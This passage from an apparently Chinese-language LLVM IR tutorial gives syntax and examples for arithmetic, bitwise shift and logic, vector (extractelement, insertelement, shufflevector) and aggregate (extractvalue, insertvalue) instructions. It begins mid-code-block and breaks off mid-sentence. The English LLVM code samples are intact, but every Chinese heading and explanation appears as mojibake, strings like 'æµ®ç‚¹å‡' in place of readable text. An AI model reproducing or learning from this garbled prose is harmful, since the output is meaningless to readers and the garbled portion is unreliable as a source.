fadd float 4.0, %var          ; yields float:result &#x3D; 4.0 + %var</code></pre><h4 id="sub-å‡">sub   å‡</h4><pre class="language-none"><code class="language-none">#Syntax&lt;result&gt; &#x3D; sub &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;          ; yields ty:result&lt;result&gt; &#x3D; sub nuw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;      ; yields ty:result&lt;result&gt; &#x3D; sub nsw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;      ; yields ty:result&lt;result&gt; &#x3D; sub nuw nsw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;  ; yields ty:result#example&lt;result&gt; &#x3D; sub i32 4, %var          ; yields i32:result &#x3D; 4 - %var&lt;result&gt; &#x3D; sub i32 0, %val          ; yields i32:result &#x3D; -%var</code></pre><h4 id="fsub-æµ®ç‚¹å‡">fsub  æµ®ç‚¹å‡</h4><pre class="language-none"><code class="language-none">#Syntax&lt;result&gt; &#x3D; fsub [fast-math flags]* &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;   ; yields ty:result#example&lt;result&gt; &#x3D; fsub float 4.0, %var           ; yields float:result &#x3D; 4.0 - %var&lt;result&gt; &#x3D; fsub float -0.0, %val          ; yields float:result &#x3D; -%var</code></pre><h4 id="mul-ä¹˜">mul   ä¹˜</h4><pre class="language-none"><code class="language-none">#Syntax&lt;result&gt; &#x3D; mul &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;          ; yields ty:result&lt;result&gt; &#x3D; mul nuw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;      ; yields ty:result&lt;result&gt; &#x3D; mul nsw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;      ; yields ty:result&lt;result&gt; &#x3D; mul nuw nsw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;  ; yields ty:result#example&lt;result&gt; &#x3D; mul i32 4, %var          ; yields i32:result &#x3D; 4 * %var</code></pre><h4 id="fmul-æµ®ç‚¹ä¹˜">fmul  æµ®ç‚¹ä¹˜</h4><pre class="language-none"><code class="language-none">#Syntax&lt;result&gt; &#x3D; fmul [fast-math flags]* &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;   ; yields ty:result#example&lt;result&gt; &#x3D; fmul float 4.0, %var          ; yields float:result &#x3D; 4.0 * %var</code></pre><h4 id="udiv-æ— ç¬¦å·æ•´æ•°é™¤">udiv  æ— ç¬¦å·æ•´æ•°é™¤</h4><pre class="language-none"><code class="language-none">#Syntax&lt;result&gt; &#x3D; udiv &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;         ; yields ty:result&lt;result&gt; &#x3D; udiv exact &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;   ; yields ty:result#example&lt;result&gt; &#x3D; udiv i32 4, %var          ; yields i32:result &#x3D; 4 &#x2F; %var</code></pre><h4 id="sdiv-å¸¦ç¬¦å·æ•´æ•°é™¤">sdiv  å¸¦ç¬¦å·æ•´æ•°é™¤</h4><pre class="language-none"><code class="language-none">#Syntax&lt;result&gt; &#x3D; sdiv &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;         ; yields ty:result&lt;result&gt; &#x3D; sdiv exact &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;   ; yields ty:result#example&lt;result&gt; &#x3D; sdiv i32 4, %var          ; yields i32:result &#x3D; 4 &#x2F; %var</code></pre><h4 id="fdiv-æµ®ç‚¹é™¤">fdiv  æµ®ç‚¹é™¤</h4><pre class="language-none"><code class="language-none">#Syntax&lt;result&gt; &#x3D; fdiv [fast-math flags]* &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;   ; yields ty:result#example&lt;result&gt; &#x3D; fdiv float 4.0, %var          ; yields float:result &#x3D; 4.0 &#x2F; %var</code></pre><h4 id="urem-æ— ç¬¦å·æ•´æ•°æ±‚ä½™">urem  æ— ç¬¦å·æ•´æ•°æ±‚ä½™</h4><pre class="language-none"><code class="language-none">#Syntax&lt;result&gt; &#x3D; urem &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;   ; yields ty:result#example&lt;result&gt; &#x3D; urem i32 4, %var          ; yields i32:result &#x3D; 4 % %var</code></pre><h4 id="srem-å¸¦ç¬¦å·æ•´æ•°æ±‚ä½™">srem  å¸¦ç¬¦å·æ•´æ•°æ±‚ä½™</h4><pre class="language-none"><code class="language-none">#Syntax&lt;result&gt; &#x3D; srem &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;   ; yields ty:result#example&lt;result&gt; &#x3D; srem i32 4, %var          ; yields i32:result &#x3D; 4 % %var</code></pre><h4 id="frem-æµ®ç‚¹æ•°æ±‚ä½™">frem  æµ®ç‚¹æ•°æ±‚ä½™</h4><pre class="language-none"><code class="language-none">#Syntax&lt;result&gt; &#x3D; frem [fast-math flags]* &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;   ; yields ty:result#example&lt;result&gt; &#x3D; frem float 4.0, %var          ; yields float:result &#x3D; 4.0 % %var</code></pre><h3 id="ä½äºŒè¿›åˆ¶æ“ä½œæŒ‡ä»¤-Bitwise-Binary-Operations">ä½äºŒè¿›åˆ¶æ“ä½œæŒ‡ä»¤ (<a href="https://llvm.org/docs/LangRef.html#id1890">Bitwise Binary Operations</a>)</h3><h4 id="shl-é€»è¾‘å·¦ç§»">shl é€»è¾‘å·¦ç§»</h4><p><font color='red'>è¿”å›<op1>å‘å·¦ç§»ä½æŒ‡å®š<op2>çš„ç»“æœ</font></p><p><font color='cornflowerblue'>å³ $op1 * 2^{op2} mod (2^n)$, <code>n</code>ä¸ºresultçš„å®½åº¦</font></p><ul><li><code>&lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;</code>ï¼Œä¸¤ä¸ªæ“ä½œæ•°çš„ç±»å‹ç›¸åŒä¸”å¿…é¡»æ˜¯æ•´å‹ç±»å‹æˆ–è€…æ•´å‹å‘é‡ï¼Œ<code>&lt;op2&gt;</code>ä½œä¸ºæ— ç¬¦å·å€¼æ¥å¤„ç†ã€‚å¦‚æœ<code>&lt;op1&gt;</code>æ˜¯å‘é‡ï¼Œ<code>&lt;op2&gt;</code>å°†ä¼šæŒ‰ç…§<code>&lt;op1&gt;</code>çš„å…ƒç´ é€ä¸ªç§»åŠ¨</li><li>å¦‚æœå­˜åœ¨<code>nuw</code>å…³é”®å­—ï¼Œåˆ™å¦‚æœç§»ä½ä»»ä½•éé›¶ä½ï¼Œåˆ™ç§»ä½å°†äº§ç”Ÿä¸€ä¸ª<a href="https://llvm.org/docs/LangRef.html#poisonvalues">poison value</a>(æ˜¯é”™è¯¯æ“ä½œçš„ç»“æœ)ã€‚</li><li>å¦‚æœ<code>nsw</code>å…³é”®å­—å­˜åœ¨ï¼Œåˆ™å¦‚æœç§»ä½ä¸ç”Ÿæˆçš„ç¬¦å·ä½ä¸ä¸€è‡´çš„ä»»ä½•ä½ï¼Œåˆ™ç§»ä½å°†äº§ç”Ÿä¸€ä¸ª<a href="https://llvm.org/docs/LangRef.html#poisonvalues">poison value</a>(æ˜¯é”™è¯¯æ“ä½œçš„ç»“æœ)ã€‚</li></ul><pre class="language-none"><code class="language-none">#Syntax&lt;result&gt; &#x3D; shl &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;           ; yields ty:result&lt;result&gt; &#x3D; shl nuw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;       ; yields ty:result&lt;result&gt; &#x3D; shl nsw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;       ; yields ty:result&lt;result&gt; &#x3D; shl nuw nsw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;   ; yields ty:result#example&lt;result&gt; &#x3D; shl i32 4, %var   ; yields i32: 4 &lt;&lt; %var&lt;result&gt; &#x3D; shl i32 4, 2      ; yields i32: 16&lt;result&gt; &#x3D; shl i32 1, 10     ; yields i32: 1024&lt;result&gt; &#x3D; shl i32 1, 32     ; undefined&lt;result&gt; &#x3D; shl &lt;2 x i32&gt; &lt; i32 1, i32 1&gt;, &lt; i32 1, i32 2&gt;   ; yields: result&#x3D;&lt;2 x i32&gt; &lt; i32 2, i32 4&gt;</code></pre><h4 id="lshr-é€»è¾‘å³ç§»">lshr  é€»è¾‘å³ç§»</h4><p><font color='red'>è¿”å›<op1>å‘å³ç§»æŒ‡å®š<op2>é›¶å¡«å……ä½çš„ç»“æœ</font></p><p>lshræŒ‡ä»¤çš„ä¸¤ä¸ªå‚æ•°å¿…é¡»æ˜¯ç›¸åŒçš„æ•´æ•°æˆ–æ•´æ•°ç±»å‹çš„å‘é‡ã€‚op2è¢«è§†ä¸ºæ— ç¬¦å·å€¼ã€‚</p><p><font color='red'><result>çš„æœ€é«˜æœ‰æ•ˆä½åœ¨ç§»ä½åå°†è¢«é›¶ä½å¡«å……ã€‚</font></p><ul><li><code>&lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;</code>ï¼Œä¸¤ä¸ªæ“ä½œæ•°çš„ç±»å‹ç›¸åŒä¸”å¿…é¡»æ˜¯æ•´å‹ç±»å‹æˆ–è€…æ•´å‹å‘é‡ï¼Œä½œä¸ºæ— ç¬¦å·å€¼æ¥å¤„ç†ã€‚å¦‚æœæ˜¯å‘é‡ï¼Œå°†ä¼šæŒ‰ç…§çš„å…ƒç´ é€ä¸ªç§»åŠ¨ã€‚</li><li>å¦‚æœ<code>exact</code>å…³é”®å­—å­˜åœ¨ï¼Œå¦‚æœç§»å‡ºçš„ä»»ä½•ä½éƒ½æ˜¯éé›¶çš„ï¼Œé‚£ä¹ˆLSHRçš„ç»“æœå€¼å°±è¿”å›ä¸€ä¸ª<a href="https://llvm.org/docs/LangRef.html#poisonvalues">poison value</a>(æ˜¯é”™è¯¯æ“ä½œçš„ç»“æœ)ã€‚</li></ul><pre class="language-none"><code class="language-none">#Syntax&lt;result&gt; &#x3D; lshr &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;         ; yields ty:result&lt;result&gt; &#x3D; lshr exact &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;   ; yields ty:result#example&lt;result&gt; &#x3D; lshr i32 4, 1   ; yields i32:result &#x3D; 2&lt;result&gt; &#x3D; lshr i32 4, 2   ; yields i32:result &#x3D; 1&lt;result&gt; &#x3D; lshr i8  4, 3   ; yields i8:result &#x3D; 0&lt;result&gt; &#x3D; lshr i8 -2, 1   ; yields i8:result &#x3D; 0x7F&lt;result&gt; &#x3D; lshr i32 1, 32  ; undefined&lt;result&gt; &#x3D; lshr &lt;2 x i32&gt; &lt; i32 -2, i32 4&gt;, &lt; i32 1, i32 2&gt;   ; yields: result&#x3D;&lt;2 x i32&gt; &lt; i32 0x7FFFFFFF, i32 1&gt;</code></pre><h4 id="ashr-ç®—æ•°å³ç§»">ashr  ç®—æ•°å³ç§»</h4><p><font color='red'><code>ashr</code>æŒ‡ä»¤(ç®—æœ¯å³ç§»)é€šè¿‡ç¬¦å·æ‰©å±•è¿”å›<op1>å‘å³ç§»æŒ‡å®šä½æ•°<op2>ã€‚</font></p><p><font color='red'><result>çš„æœ€é«˜æœ‰æ•ˆä½å°†è¢«op1çš„ç¬¦å·ä½å¡«å……ã€‚</font></p><ul><li><code>&lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;</code>ï¼Œä¸¤ä¸ªæ“ä½œæ•°çš„ç±»å‹ç›¸åŒä¸”å¿…é¡»æ˜¯æ•´å‹ç±»å‹æˆ–è€…æ•´å‹å‘é‡ï¼Œä½œä¸ºæ— ç¬¦å·å€¼æ¥å¤„ç†ã€‚å¦‚æœæ˜¯å‘é‡ï¼Œå°†ä¼šæŒ‰ç…§çš„å…ƒç´ é€ä¸ªç§»åŠ¨ã€‚</li><li>å¦‚æœ<code>exact</code>å…³é”®å­—å­˜åœ¨ï¼Œå¦‚æœç§»å‡ºçš„ä»»ä½•ä½éƒ½æ˜¯éé›¶ï¼Œ<code>ashr</code>çš„ç»“æœå€¼è¿”å›ä¸€ä¸ª<a href="https://llvm.org/docs/LangRef.html#poisonvalues">poison value</a>(æ˜¯é”™è¯¯æ“ä½œçš„ç»“æœ)ã€‚</li></ul><pre class="language-none"><code class="language-none">#Syntax&lt;result&gt; &#x3D; ashr &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;         ; yields ty:result&lt;result&gt; &#x3D; ashr exact &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;   ; yields ty:result#example&lt;result&gt; &#x3D; ashr i32 4, 1   ; yields i32:result &#x3D; 2&lt;result&gt; &#x3D; ashr i32 4, 2   ; yields i32:result &#x3D; 1&lt;result&gt; &#x3D; ashr i8  4, 3   ; yields i8:result &#x3D; 0&lt;result&gt; &#x3D; ashr i8 -2, 1   ; yields i8:result &#x3D; -1&lt;result&gt; &#x3D; ashr i32 1, 32  ; undefined&lt;result&gt; &#x3D; ashr &lt;2 x i32&gt; &lt; i32 -2, i32 4&gt;, &lt; i32 1, i32 3&gt;   ; yields: result&#x3D;&lt;2 x i32&gt; &lt; i32 -1, i32 0&gt;</code></pre><h4 id="and-ä¸">and   ä¸</h4><table><thead><tr><th>In0</th><th>In1</th><th>Out</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>0</td></tr><tr><td>0</td><td>1</td><td>0</td></tr><tr><td>1</td><td>0</td><td>0</td></tr><tr><td>1</td><td>1</td><td>1</td></tr></tbody></table><pre class="language-none"><code class="language-none">#Syntax&lt;result&gt; &#x3D; and &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;   ; yields ty:result#example&lt;result&gt; &#x3D; and i32 4, %var         ; yields i32:result &#x3D; 4 &amp; %var&lt;result&gt; &#x3D; and i32 15, 40          ; yields i32:result &#x3D; 8&lt;result&gt; &#x3D; and i32 4, 8            ; yields i32:result &#x3D; 0</code></pre><h4 id="or-æˆ–">or   æˆ–</h4><table><thead><tr><th>In0</th><th>In1</th><th>Out</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>0</td></tr><tr><td>0</td><td>1</td><td>1</td></tr><tr><td>1</td><td>0</td><td>1</td></tr><tr><td>1</td><td>1</td><td>1</td></tr></tbody></table><ul><li><ty> <op1>, <op2>ï¼Œä¸¤ä¸ªæ“ä½œæ•°çš„ç±»å‹ç›¸åŒä¸”å¿…é¡»æ˜¯æ•´å‹ç±»å‹æˆ–è€…æ•´å‹å‘é‡ã€‚</li></ul><pre class="language-none"><code class="language-none">#Syntax&lt;result&gt; &#x3D; or &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;   ; yields ty:result#example&lt;result&gt; &#x3D; or i32 4, %var         ; yields i32:result &#x3D; 4 | %var&lt;result&gt; &#x3D; or i32 15, 40          ; yields i32:result &#x3D; 47&lt;result&gt; &#x3D; or i32 4, 8            ; yields i32:result &#x3D; 12</code></pre><h4 id="xor-å¼‚æˆ–">xor   å¼‚æˆ–</h4><table><thead><tr><th>In0</th><th>In1</th><th>Out</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>0</td></tr><tr><td>0</td><td>1</td><td>1</td></tr><tr><td>1</td><td>0</td><td>1</td></tr><tr><td>1</td><td>1</td><td>0</td></tr></tbody></table><ul><li><ty> <op1>, <op2>ï¼Œä¸¤ä¸ªæ“ä½œæ•°çš„ç±»å‹ç›¸åŒä¸”å¿…é¡»æ˜¯æ•´å‹ç±»å‹æˆ–è€…æ•´å‹å‘é‡ã€‚</li></ul><pre class="language-none"><code class="language-none">#Syntax&lt;result&gt; &#x3D; xor &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;   ; yields ty:result#example&lt;result&gt; &#x3D; xor i32 4, %var         ; yields i32:result &#x3D; 4 ^ %var&lt;result&gt; &#x3D; xor i32 15, 40          ; yields i32:result &#x3D; 39&lt;result&gt; &#x3D; xor i32 4, 8            ; yields i32:result &#x3D; 12&lt;result&gt; &#x3D; xor i32 %V, -1          ; yields i32:result &#x3D; ~%V</code></pre><h3 id="å‘é‡è¿ç®—-Vector-Operations">å‘é‡è¿ç®—(<a href="https://llvm.org/docs/LangRef.html#id1927">Vector Operations</a>)</h3><h4 id="extractelement">extractelement</h4><p><code>extractelement</code>æŒ‡ä»¤ä»æŒ‡å®šç´¢å¼•å¤„çš„å‘é‡ä¸­æå–å•ä¸ªçŸ¢é‡å…ƒç´ ã€‚</p><pre class="language-none"><code class="language-none">#Syntax:&lt;result&gt; &#x3D; extractelement &lt;n x &lt;ty&gt;&gt; &lt;val&gt;, &lt;ty2&gt; &lt;idx&gt;  ; yields &lt;ty&gt;&lt;result&gt; &#x3D; extractelement &lt;vscale x n x &lt;ty&gt;&gt; &lt;val&gt;, &lt;ty2&gt; &lt;idx&gt; ; yields &lt;ty&gt;</code></pre><p><strong>Arguments:</strong></p><p>æå–æŒ‡ä»¤çš„ç¬¬ä¸€ä¸ªæ“ä½œæ•°æ˜¯ <a href="https://llvm.org/docs/LangRef.html#t-vector">vector</a> ç±»å‹çš„å€¼ã€‚ç¬¬äºŒä¸ªæ“ä½œæ•°æ˜¯æŒ‡ç¤ºä»ä½•å¤„æå–å…ƒç´ çš„ä½ç½®çš„ç´¢å¼•ã€‚ç´¢å¼•å¯ä»¥æ˜¯ä»»ä½•æ•´æ•°ç±»å‹çš„å˜é‡ã€‚</p><ul><li><code>&lt;ty2&gt; &lt;idx&gt;</code>ç´¢å¼•å€¼å¤§äºç­‰äºé›¶ï¼Œå°äºå‘é‡çš„é•¿åº¦ã€‚</li></ul><p><strong>Semantics:</strong></p><p>ç»“æœæ˜¯ä¸ val çš„å…ƒç´ ç±»å‹ç›¸åŒç±»å‹çš„çŸ¢é‡ã€‚ å®ƒçš„å€¼æ˜¯ val  idx ä½ç½®çš„å€¼ã€‚</p><ul><li>å¦‚æœidxè¶…è¿‡äº†å›ºå®šé•¿åº¦å‘é‡çš„valçš„é•¿åº¦ï¼Œç»“æœå°†æ˜¯ä¸€ä¸ª<a href="https://llvm.org/docs/LangRef.html#poisonvalues">poison value</a>(æ˜¯é”™è¯¯æ“ä½œçš„ç»“æœ)ã€‚</li><li>å¯¹äºå¯ä¼¸ç¼©çš„å‘é‡ï¼Œå¦‚æœidxçš„å€¼è¶…è¿‡äº†å‘é‡çš„è¿è¡Œæ—¶é•¿åº¦ï¼Œåˆ™ç»“æœæ˜¯ä¸€ä¸ª<a href="https://llvm.org/docs/LangRef.html#poisonvalues">poison value</a>(æ˜¯é”™è¯¯æ“ä½œçš„ç»“æœ)ã€‚</li></ul><pre class="language-none"><code class="language-none"># Example:&lt;result&gt; &#x3D; extractelement &lt;4 x i32&gt; %vec, i32 0    ; yields i32</code></pre><h4 id="insertelement">insertelement</h4><p><code>insertelement</code>æŒ‡ä»¤å°†çŸ¢é‡å…ƒç´ æ’å…¥åˆ°æŒ‡å®šç´¢å¼•å¤„çš„å‘é‡ä¸­ã€‚</p><pre class="language-none"><code class="language-none">Syntax:&lt;result&gt; &#x3D; insertelement &lt;n x &lt;ty&gt;&gt; &lt;val&gt;, &lt;ty&gt; &lt;elt&gt;, &lt;ty2&gt; &lt;idx&gt;    ; yields &lt;n x &lt;ty&gt;&gt;&lt;result&gt; &#x3D; insertelement &lt;vscale x n x &lt;ty&gt;&gt; &lt;val&gt;, &lt;ty&gt; &lt;elt&gt;, &lt;ty2&gt; &lt;idx&gt; ; yields &lt;vscale x n x &lt;ty&gt;&gt;</code></pre><p><strong>Arguments:</strong></p><p><code>insertelement</code>æŒ‡ä»¤çš„ç¬¬ä¸€ä¸ªæ“ä½œæ•°æ˜¯ <a href="https://llvm.org/docs/LangRef.html#t-vector">vector</a> ç±»å‹çš„å€¼ã€‚ ç¬¬äºŒä¸ªæ“ä½œæ•°æ˜¯ä¸€ä¸ªçŸ¢é‡å€¼ï¼Œå…¶ç±»å‹å¿…é¡»ç­‰äºç¬¬ä¸€ä¸ªæ“ä½œæ•°çš„å…ƒç´ ç±»å‹ã€‚ ç¬¬ä¸‰ä¸ªæ“ä½œæ•°æ˜¯æŒ‡ç¤ºæ’å…¥å€¼çš„ä½ç½®çš„ç´¢å¼•ã€‚ ç´¢å¼•å¯ä»¥æ˜¯ä»»ä½•æ•´æ•°ç±»å‹çš„å˜é‡ã€‚</p><p><strong>Semantics:</strong></p><ul><li>ç»“æœæ˜¯ä¸€ä¸ªä¸ <code>val </code>ç±»å‹ç›¸åŒçš„å‘é‡ã€‚ å®ƒçš„å…ƒç´ å€¼æ˜¯<code>val</code>çš„å€¼ï¼Œé™¤äº†ä½ç½®<code> idx</code>ï¼Œå®ƒåœ¨è¯¥ä½ç½®è·å¾—å€¼ <code>elt</code>ã€‚ å¦‚æœ <code>idx </code>è¶…è¿‡å›ºå®šé•¿åº¦å‘é‡çš„ <code>val </code>é•¿åº¦ï¼Œåˆ™ç»“æœæ˜¯<a href="https://llvm.org/docs/LangRef.html#poisonvalues">poison value</a>.</li><li>å¯¹äºå¯ä¼¸ç¼©å‘é‡ï¼Œå¦‚æœ<code>idx</code>çš„å€¼è¶…è¿‡äº†å‘é‡çš„è¿è¡Œæ—¶é•¿åº¦ï¼Œåˆ™ç»“æœæ˜¯<a href="https://llvm.org/docs/LangRef.html#poisonvalues">poison value</a>.</li></ul><pre class="language-none"><code class="language-none"># Example:&lt;result&gt; &#x3D; insertelement &lt;4 x i32&gt; %vec, i32 1, i32 0    ; yields &lt;4 x i32&gt;</code></pre><h4 id="shufflevector">shufflevector</h4><p><code>shufflevector</code>æŒ‡ä»¤ä»ä¸¤ä¸ªè¾“å…¥å‘é‡æ„é€ å…ƒç´ çš„æ’åˆ—ï¼Œè¿”å›ä¸€ä¸ªä¸è¾“å…¥å…·æœ‰ç›¸åŒå…ƒç´ ç±»å‹ä¸”é•¿åº¦ä¸shuffle maskç›¸åŒçš„å‘é‡ã€‚</p><pre class="language-none"><code class="language-none"># Syntax:&lt;result&gt; &#x3D; shufflevector &lt;n x &lt;ty&gt;&gt; &lt;v1&gt;, &lt;n x &lt;ty&gt;&gt; &lt;v2&gt;, &lt;m x i32&gt; &lt;mask&gt;    ; yields &lt;m x &lt;ty&gt;&gt;&lt;result&gt; &#x3D; shufflevector &lt;vscale x n x &lt;ty&gt;&gt; &lt;v1&gt;, &lt;vscale x n x &lt;ty&gt;&gt; v2, &lt;vscale x m x i32&gt; &lt;mask&gt;  ; yields &lt;vscale x m x &lt;ty&gt;&gt;</code></pre><p><strong>Arguments:</strong></p><p>æŒ‡ä»¤çš„ç»“æœæ˜¯ä¸€ä¸ªå‘é‡ï¼Œå…¶é•¿åº¦ä¸shuffle maskç›¸åŒï¼Œå…¶å…ƒç´ ç±»å‹ä¸å‰ä¸¤ä¸ªæ“ä½œæ•°çš„å…ƒç´ ç±»å‹ç›¸åŒã€‚</p><ul><li><code>shufflevector</code>æŒ‡ä»¤çš„å‰ä¸¤ä¸ªæ“ä½œæ•°æ˜¯ç›¸åŒç±»å‹çš„å‘é‡ã€‚ ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªshuffle maskå‘é‡å¸¸é‡ï¼Œå…¶å…ƒç´ ç±»å‹ä¸º<code>i32</code>ã€‚ æ©ç å‘é‡å…ƒç´ å¿…é¡»æ˜¯å¸¸é‡æ•´æ•°æˆ–<code>undef</code>å€¼ã€‚</li><li><code>&lt;n x &lt;ty&gt;&gt; &lt;v1&gt;, &lt;n x &lt;ty&gt;&gt; &lt;v2&gt;</code>ä¸¤ä¸ªè¾“å…¥å‘é‡ï¼Œå¦‚æœè¾“å…¥å‘é‡ä¸­æœªå®šä¹‰çš„å…ƒç´ è¢«é€‰ä¸­ï¼Œåˆ™æ–°å‘é‡å¯¹åº”çš„å…ƒç´ ä¹Ÿæ˜¯æœªå®šä¹‰ã€‚</li><li><code>&lt;m x i32&gt; &lt;mask&gt;</code>è°ƒæ•´æ©ç (shuffle mask)ï¼Œå¦‚æœè°ƒæ•´æ©ç æ˜¯æœªå®šä¹‰çš„ï¼Œåˆ™æ–°å‘é‡å°±æ˜¯æœªå®šä¹‰çš„ã€‚</li></ul><p><strong>Semantics:</strong></p><p>ä¸¤ä¸ªè¾“å…¥å‘é‡çš„å…ƒç´ åœ¨ä¸¤ä¸ªå‘é‡ä¸­ä»å·¦åˆ°å³ç¼–å·ã€‚ å¯¹äºç»“æœå‘é‡çš„æ¯ä¸ªå…ƒç´ ï¼Œéšæœºæ©ç ä»è¾“å…¥å‘é‡ä¹‹ä¸€ä¸­é€‰æ‹©ä¸€ä¸ªå…ƒç´ ä»¥å¤åˆ¶åˆ°ç»“æœä¸­ã€‚ æ©ç ä¸­çš„éè´Ÿå…ƒç´ è¡¨ç¤ºè¿æ¥è¾“å…¥å‘é‡å¯¹çš„ç´¢å¼•ã€‚</p><p>If the shuffle mask is undefined, the result vector is undefined. If the shuffle mask selects an undefined element from one of the input vectors, the resulting element is undefined. An undefined element in the mask vector specifies that the resulting element is undefined. An undefined element in the mask vector prevents a poisoned vector element from propagating.</p><p>å¯¹äºå¯ä¼¸ç¼©çŸ¢é‡, the only valid mask values at present are <code>zeroinitializer</code> and <code>undef</code>, since we cannot write all indices as literals for a vector with a length unknown at compile time.</p><p><strong>Example:</strong></p><pre class="language-none"><code class="language-none">&lt;result&gt; &#x3D; shufflevector &lt;4 x i32&gt; %v1, &lt;4 x i32&gt; %v2,                        &lt;4 x i32&gt; &lt;i32 0, i32 4, i32 1, i32 5&gt;  ; yields &lt;4 x i32&gt;&lt;result&gt; &#x3D; shufflevector &lt;4 x i32&gt; %v1, &lt;4 x i32&gt; undef,                        &lt;4 x i32&gt; &lt;i32 0, i32 1, i32 2, i32 3&gt;  ; yields &lt;4 x i32&gt; - Identity shuffle.&lt;result&gt; &#x3D; shufflevector &lt;8 x i32&gt; %v1, &lt;8 x i32&gt; undef,                        &lt;4 x i32&gt; &lt;i32 0, i32 1, i32 2, i32 3&gt;  ; yields &lt;4 x i32&gt;&lt;result&gt; &#x3D; shufflevector &lt;4 x i32&gt; %v1, &lt;4 x i32&gt; %v2,                        &lt;8 x i32&gt; &lt;i32 0, i32 1, i32 2, i32 3, i32 4, i32 5, i32 6, i32 7 &gt;  ; yields &lt;8 x i32&gt;</code></pre><h3 id="èšåˆæ“ä½œ-Aggregate-Operations">èšåˆæ“ä½œ(<a href="https://llvm.org/docs/LangRef.html#id1946">Aggregate Operations</a>)</h3><h4 id="extractvalue">extractvalue</h4><p><code>extractvalue</code>æŒ‡ä»¤ä» <a href="https://llvm.org/docs/LangRef.html#t-aggregate">aggregate</a> å€¼ä¸­æå–æˆå‘˜å­—æ®µçš„å€¼ã€‚</p><pre class="language-none"><code class="language-none">#Syntax:&lt;result&gt; &#x3D; extractvalue &lt;aggregate type&gt; &lt;val&gt;, &lt;idx&gt;&#123;, &lt;idx&gt;&#125;*</code></pre><p><strong>Arguments:</strong></p><ul><li><code>&lt;aggregate type&gt; &lt;val&gt;</code>èšåˆç±»å‹ï¼Œæ•°ç»„æˆ–ç»“æ„ä½“ã€‚</li><li><code>&lt;idx&gt;&#123;, &lt;idx&gt;&#125;*</code>å¸¸é‡ç´¢å¼•å€¼ï¼Œæå–æŒ‡å®šç´¢å¼•å¤„çš„å…ƒç´ ã€‚</li></ul><p><code>extractvalue</code>â€™æŒ‡ä»¤çš„ç¬¬ä¸€ä¸ªæ“ä½œæ•°æ˜¯ <a href="https://llvm.org/docs/LangRef.html#t-struct">struct</a> æˆ– [array](<a href="https://llvm.org/">https://llvm.org/</a> docs/LangRef.html#t-array) ç±»å‹ã€‚ å…¶ä»–æ“ä½œæ•°æ˜¯å¸¸é‡ç´¢å¼•ï¼Œç”¨äºæŒ‡å®šä»¥ä¸<code>getelementptr</code>æŒ‡ä»¤ä¸­çš„ç´¢å¼•ç±»ä¼¼çš„æ–¹å¼æå–å“ªä¸ªå€¼ã€‚</p><p>ä¸<code>getelementptr</code> ç´¢å¼•çš„ä¸»è¦åŒºåˆ«æ˜¯ï¼š</p><ul><li>ç”±äºè¢«ç´¢å¼•çš„å€¼ä¸æ˜¯æŒ‡é’ˆï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªç´¢å¼•è¢«çœç•¥å¹¶å‡å®šä¸ºé›¶ã€‚</li><li>å¿…é¡»è‡³å°‘æŒ‡å®šä¸€ä¸ªç´¢å¼•ã€‚</li><li>ä¸ä»…ç»“æ„ç´¢å¼•è€Œä¸”æ•°ç»„ç´¢å¼•ä¹Ÿå¿…é¡»åœ¨èŒƒå›´å†…ã€‚</li></ul><p><strong>Semantics:</strong></p><p>ç»“æœæ˜¯ç´¢å¼•æ“ä½œæ•°æŒ‡å®šçš„èšåˆä¸­ä½ç½®å¤„çš„å€¼ã€‚</p><pre class="language-none"><code class="language-none">#Example:&lt;result&gt; &#x3D; extractvalue &#123;i32, float&#125; %agg, 0    ; yields i32</code></pre><h4 id="insertvalue">insertvalue</h4><p><code>insertvalue</code>â€™æŒ‡ä»¤å°†ä¸€ä¸ªå€¼æ’å…¥åˆ° <a href="https://llvm.org/docs/LangRef.html#t-aggregate">aggregate</a> å€¼çš„æˆå‘˜å­—æ®µä¸­ã€‚</p><pre class="language-none"><code class="language-none">#Syntax:&lt;result&gt; &#x3D; insertvalue &lt;aggregate type&gt; &lt;val&gt;, &lt;ty&gt; &lt;elt&gt;, &lt;idx&gt;&#123;, &lt;idx&gt;&#125;*    ; yields &lt;aggregate type&gt;</code></pre><p><strong>Arguments:</strong></p><ul><li><code>&lt;aggregate type&gt; &lt;val&gt;</code>èšåˆç±»å‹ï¼Œæ•°ç»„æˆ–ç»“æ„ä½“ã€‚</li><li><code>&lt;ty&gt; &lt;elt&gt;</code>è¦æ’å…¥çš„æ•°æ®ï¼Œ</li><li><code>&lt;idx&gt;&#123;, 